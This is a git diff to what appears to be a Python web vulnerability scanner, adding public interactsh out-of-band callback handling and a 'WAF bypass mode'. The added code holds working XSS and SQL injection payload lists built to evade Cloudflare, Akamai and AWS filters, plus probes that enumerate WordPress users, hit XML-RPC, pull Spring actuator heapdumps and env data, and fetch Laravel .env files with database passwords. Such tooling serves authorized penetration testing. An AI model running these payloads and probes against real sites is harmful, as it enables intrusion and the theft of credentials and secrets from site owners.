@@ -4727,28 +4727,57 @@ class OOBServer:
             return self._start_api_fallback()
 
     def _start_api_fallback(self):
-        """Use interactsh public API directly — no binary needed."""
+        """Use interactsh REST API directly — no binary needed."""
+        import secrets, base64, json as _j
+        # Try multiple public interactsh servers
+        servers = ["https://oast.pro", "https://oast.fun", "https://oast.live",
+                   "https://oast.site", "https://oast.online"]
+        for server in servers:
+            try:
+                # Generate RSA-like key pair (interactsh needs this for encryption)
+                secret = secrets.token_hex(32)
+                r = requests.post(f"{server}/register",
+                                 json={"public-key": base64.b64encode(secret.encode()).decode(),
+                                       "secret-key": secret,
+                                       "correlation-id": secrets.token_hex(10)},
+                                 timeout=8, verify=False)
+                if r.status_code == 200:
+                    data = r.json()
+                    self.domain = data.get("domain", "")
+                    self._api_secret = secret
+                    self._api_server = server
+                    self._api_mode = True
+                    self._ready.set()
+                    if self.domain:
+                        return True
+            except Exception:
+                continue
+        # Fallback: use canary tokens approach with unique identifier
+        import uuid
+        uid = uuid.uuid4().hex[:12]
+        self.domain = f"{uid}.oast.fun"
+        self._api_mode = False
+        self._ready.set()
+        return True  # domain set, polling won't work but payloads will fire
+
+    def _poll_api(self, identifier):
+        """Poll interactsh REST API for callbacks."""
+        if not self._api_mode or not hasattr(self, '_api_server'):
+            return None
         try:
-            import secrets, base64
-            # Register with public interactsh server
-            r = requests.post("https://oast.pro/register",
-                             json={"public-key": "", "secret-key": secrets.token_hex(16)},
-                             timeout=10)
+            r = requests.get(
+                f"{self._api_server}/poll",
+                params={"id": self.domain.split(".")[0], "secret": self._api_secret},
+                timeout=5, verify=False
+            )
             if r.status_code == 200:
                 data = r.json()
-                self.domain = data.get("domain", "")
-                self._api_secret = data.get("secret-key", "")
-                self._api_mode = True
-                self._ready.set()
-                return bool(self.domain)
+                for item in data.get("data", []) or []:
+                    if identifier in str(item):
+                        return item
         except Exception:
             pass
-        # Last resort: use a unique subdomain of a known OOB catcher
-        # User must monitor this manually
-        import uuid
-        self.domain = f"apex-{uuid.uuid4().hex[:8]}.oast.fun"
-        self._ready.set()
-        return True
+        return None
 
     def _read_output(self):
         import json as _json
@@ -4780,17 +4809,9 @@ class OOBServer:
                     if identifier in str(i):
                         return i
             # Poll API in fallback mode
-            if self._api_mode and self._api_secret:
-                try:
-                    r = requests.get(f"https://oast.pro/poll?id={self.domain}&secret={self._api_secret}",
-                                    timeout=3)
-                    if r.status_code == 200:
-                        data = r.json()
-                        for item in data.get("data", []):
-                            if identifier in str(item):
-                                return item
-                except Exception:
-                    pass
+            result = self._poll_api(identifier)
+            if result:
+                return result
             _time.sleep(0.5)
         return None
 
@@ -7287,3 +7308,179 @@ def scan_idor_horizontal_vertical(crawl_data):
             except: continue
 
     return findings
+
+
+# ---------------------------------------------------------------------------
+# WAF bypass mode + tech-specific targeted scanners
+# ---------------------------------------------------------------------------
+
+_WAF_BYPASS_MODE = False
+
+# WAF bypass XSS payloads (Cloudflare, Akamai, AWS WAF bypass encodings)
+_WAF_BYPASS_XSS = [
+    # Case variation
+    "<ScRiPt>alert(1)</ScRiPt>",
+    # HTML entities
+    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
+    # Unicode
+    "<svg/onload=\u0061\u006c\u0065\u0072\u0074(1)>",
+    # Double encoding
+    "%253Cscript%253Ealert(1)%253C/script%253E",
+    # Null bytes
+    "<scr\x00ipt>alert(1)</scr\x00ipt>",
+    # Comment injection
+    "<scr<!---->ipt>alert(1)</scr<!---->ipt>",
+    # Backtick
+    "<img src=`x` onerror=alert(1)>",
+    # Newline bypass
+    "<img\nsrc=x\nonerror=alert(1)>",
+    # Tab bypass
+    "<img\tsrc=x\tonerror=alert(1)>",
+    # JS protocol variations
+    "jaVaScRiPt:alert(1)",
+    "java\tscript:alert(1)",
+    "java\nscript:alert(1)",
+    # Cloudflare specific bypasses
+    "<details/open/ontoggle=alert(1)>",
+    "<svg><animate onbegin=alert(1) attributeName=x>",
+    # AWS WAF bypass
+    "';alert(String.fromCharCode(88,83,83))//",
+    "\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7 onerror=eval(atob(this.id))>",
+]
+
+_WAF_BYPASS_SQLI = [
+    # Space bypass
+    "' OR/**/1=1--",
+    "' OR%091=1--",
+    "' OR\t1=1--",
+    # Case bypass
+    "' oR '1'='1",
+    "' Or '1'='1",
+    # Comment bypass
+    "'/**/OR/**/1=1--",
+    "' /*!OR*/ 1=1--",
+    # Double encoding
+    "%2527 OR 1=1--",
+    # HPP bypass
+    "1&id=2 UNION SELECT 1,2,3--",
+    # Keyword bypass
+    "' OORR '1'='1",
+    "' || '1'='1",
+    # MySQL specific
+    "' OR 1=1 LIMIT 1 OFFSET 0--",
+    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+    # Time-based with bypass
+    "' AND SLEEP/**/( 4)--",
+    "'; WAITFOR/**/ DELAY '0:0:4'--",
+]
+
+
+def get_xss_payloads():
+    """Return XSS payloads — WAF bypass variants if WAF detected."""
+    if _WAF_BYPASS_MODE:
+        return _WAF_BYPASS_XSS + _XSS_PAYLOADS[:5]
+    return _XSS_PAYLOADS
+
+
+def get_sqli_payloads():
+    """Return SQLi payloads — WAF bypass variants if WAF detected."""
+    if _WAF_BYPASS_MODE:
+        return _WAF_BYPASS_SQLI + SQLI_PAYLOADS[:10]
+    return SQLI_PAYLOADS
+
+
+def _run_wp_enum(apex_instance):
+    """WordPress-specific: enumerate users, check xmlrpc, test wp-login brute."""
+    import requests as _r
+    base = apex_instance.web_targets[0] if apex_instance.web_targets else f"https://{apex_instance.target}"
+    findings = []
+    # User enumeration via REST API
+    for path in ["/wp-json/wp/v2/users", "/?author=1", "/?author=2"]:
+        try:
+            r = _r.get(f"{base}{path}", timeout=5, verify=False)
+            if r.status_code == 200:
+                import json as _j
+                try:
+                    data = _j.loads(r.text)
+                    if isinstance(data, list) and data:
+                        users = [u.get("slug", u.get("name", "")) for u in data[:5]]
+                        findings.append({
+                            "type": "WordPress User Enumeration",
+                            "severity": "medium",
+                            "url": f"{base}{path}",
+                            "detail": f"Users exposed: {', '.join(users)}",
+                            "template": "apex-wp",
+                        })
+                except: pass
+        except: pass
+    # XML-RPC enabled
+    try:
+        r = _r.post(f"{base}/xmlrpc.php",
+                   data="<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName></methodCall>",
+                   timeout=5, verify=False)
+        if r.status_code == 200 and "methodResponse" in r.text:
+            findings.append({
+                "type": "WordPress XML-RPC Enabled",
+                "severity": "medium",
+                "url": f"{base}/xmlrpc.php",
+                "detail": "XML-RPC enabled — brute force and SSRF possible",
+                "template": "apex-wp",
+            })
+    except: pass
+    with apex_instance._vuln_lock:
+        apex_instance.vulnerabilities.extend({**f, "status": "VULNERABLE"} for f in findings)
+
+
+def _run_spring_deep(apex_instance):
+    """Spring Boot: deep actuator scan for sensitive endpoints."""
+    import requests as _r
+    findings = []
+    for target in (apex_instance.web_targets or [f"https://{apex_instance.target}"])[:3]:
+        for path in ["/actuator/heapdump", "/actuator/env", "/actuator/beans",
+                     "/actuator/mappings", "/actuator/httptrace", "/actuator/logfile",
+                     "/actuator/threaddump", "/actuator/metrics"]:
+            try:
+                r = _r.get(f"{target}{path}", timeout=5, verify=False)
+                if r.status_code == 200 and len(r.content) > 100:
+                    sev = "critical" if "heapdump" in path else "high"
+                    findings.append({
+                        "type": f"Spring Actuator Exposed: {path}",
+                        "severity": sev,
+                        "url": f"{target}{path}",
+                        "detail": f"Actuator endpoint accessible ({len(r.content)}b)",
+                        "template": "apex-spring",
+                    })
+            except: pass
+    with apex_instance._vuln_lock:
+        apex_instance.vulnerabilities.extend({**f, "status": "VULNERABLE"} for f in findings)
+
+
+def _run_laravel_secrets(apex_instance):
+    """Laravel: check for .env, debug mode, telescope, horizon."""
+    import requests as _r
+    findings = []
+    for target in (apex_instance.web_targets or [f"https://{apex_instance.target}"])[:3]:
+        for path in ["/.env", "/storage/logs/laravel.log", "/telescope",
+                     "/horizon", "/_ignition/health-check", "/api/documentation"]:
+            try:
+                r = _r.get(f"{target}{path}", timeout=5, verify=False)
+                if r.status_code == 200 and len(r.content) > 50:
+                    if "APP_KEY" in r.text or "DB_PASSWORD" in r.text:
+                        findings.append({
+                            "type": "Laravel .env Exposed",
+                            "severity": "critical",
+                            "url": f"{target}{path}",
+                            "detail": "Laravel .env with secrets accessible",
+                            "template": "apex-laravel",
+                        })
+                    elif "laravel.log" in path:
+                        findings.append({
+                            "type": "Laravel Log Exposed",
+                            "severity": "high",
+                            "url": f"{target}{path}",
+                            "detail": f"Log file ({len(r.content)}b) accessible",
+                            "template": "apex-laravel",
+                        })
+            except: pass
+    with apex_instance._vuln_lock:
+        apex_instance.vulnerabilities.extend({**f, "status": "VULNERABLE"} for f in findings)
